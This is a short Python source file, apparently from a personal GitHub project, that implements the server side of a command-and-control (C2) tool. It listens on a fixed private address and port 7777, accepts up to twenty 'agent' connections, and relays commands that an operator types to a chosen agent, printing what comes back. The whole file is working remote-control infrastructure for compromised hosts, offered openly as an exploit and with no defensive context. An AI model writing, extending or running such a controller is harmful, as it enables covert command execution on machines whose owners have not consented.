#To run the exploit make sure you installed the requirments from the requirements
#------------------------------------------------------------GiThUb RohitRamCharan777-----------------------------------------------------------------------
import threading
import socket
import time

server_ip="192.168.152.144"
server_port=7777
threads=[]
ips=[]
given_commends=[]
output_command_info=[]
print("-----------------------RRRRRRRRRRRRRRR---C2 SERVER---RRRRRRRRRRRRRR----------------------")
print("--------------------------------------- version 1.1.1------------------------------------")
for i in range(20):
    given_commends.append('')
    output_command_info.append('')
    ips.append('')
def handle_connection(connection,address,threads_in):
    global given_commends
    global output_command_info
    global ips
    global threads
    ips[threads_in]=address[0]
    print(f"Agent {threads_in+1} connection from {address}")
    while True:
        try:
            while given_commends[threads_in]=='':
                time.sleep(2)
            command=given_commends[threads_in]
            given_commends[threads_in]=''
            connection.send(command.encode())
            print("Command send successfully")
            print(f"command sent to {threads_in+1}:{command}")

            output=connection.recv(4096).decode()
            output_command_info[threads_in]=output
            print(f"output sent to {threads_in+1}:{output}")
        except(ConnectionResetError,BrokenPipeError):
            print("Connection breaked due to some error")
            break
    connection.close()
def server_st():
    server_socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server_socket.bind((server_ip,server_port))
    server_socket.listen(3)
    print(f"The c2 is listuning in the ip {server_ip}:{server_port}")
    while True:
        connection,address=server_socket.accept()
        if len(threads)>=20:
            connection.close()
            continue
        print(f"Established a connection from {address}")
        threads_in=len(threads)
        th=threading.Thread(target=handle_connection,args=(connection,address,threads_in),daemon=True)
        threads.append(th)
        th.start()
def get_input():
    global given_commends
    global ips
    global threads
    while True:
        try:
            agent_id=int(input("Enter the agent id: "))
            cmd=input("Enter the command: ")
            if agent_id<0 or agent_id>=len(threads):
                print("Agent id is not valid or available")
                continue
            given_commends[agent_id]=cmd
            print(f"command sent to {agent_id}:{cmd}")
        except Exception as e:
            print(f"Error: {e}")


if __name__=="__main__":
    threading.Thread(target=get_input).start()
    server_st()
